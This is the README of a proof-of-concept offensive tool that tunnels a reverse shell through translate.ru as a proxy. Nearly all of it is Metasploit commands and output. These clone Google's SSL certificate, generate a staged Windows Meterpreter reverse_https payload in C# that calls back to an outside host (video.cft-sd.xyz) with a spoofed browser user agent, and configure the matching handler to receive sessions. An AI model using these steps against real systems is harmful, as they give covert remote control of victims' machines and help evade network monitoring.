# TranslateRuShell (PoC)
Web reverse shell through translate.ru as proxy

## Generate Meterpreter payload for client

### Get Cert

1. use auxiliary/gather/impersonate_ssl
2. set RHOST www.google.com
3. set Proxies http:host:port
4. run


[\*] www.google.com:443 - Connecting to www.google.com:443

[\*] www.google.com:443 - Copying certificate from www.google.com:443

/C=PortSwigger/O=PortSwigger/OU=PortSwigger CA/CN=www.google.com 

[\*] www.google.com:443 - Beginning export of certificate files

[\*] www.google.com:443 - Creating looted key/crt/pem files for www.google.com:443

[\+] www.google.com:443 - key: /root/.msf4/loot/20181213121009_default_74.125.131.99_www.google.com_k_916621.key

[\+] www.google.com:443 - crt: /root/.msf4/loot/20181213121009_default_74.125.131.99_www.google.com_c_554054.crt

[\+] www.google.com:443 - pem: /root/.msf4/loot/20181213121009_default_74.125.131.99_www.google.com_p_521262.pem

[\*] Auxiliary module execution completed

### Generate staged payload with cert check

1. use payload/windows/meterpreter/reverse_https
2. set LHOST video.cft-sd.xyz
3. set LPORT 443
4. set HttpUserAgent "Mozilla/5.0 (X11; Windows x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
5. set LURI /rest/api
6. set stagerverifysslcert true
7. set HANDLERSSLCERT /media/sf_Pentest/20181213120429_default_74.125.131.106_www.google.com_p_105411.pem
8. set EXITFUNC thread
9. generate -t csharp

## Configure Meterpreter handler on server
1. use exploit/multi/handler
2. set PAYLOAD windows/meterpreter/reverse_https
3. set LHOST video.cft-sd.xyz
4. set LPORT 443
5. set LURI /rest/api
6. set stagerverifysslcert true
7. set HANDLERSSLCERT /media/sf_Pentest/20181213120429_default_74.125.131.106_www.google.com_p_105411.pem
8. set EXITFUNC thread
9. set ExitOnSession false
10. exploit -j -z
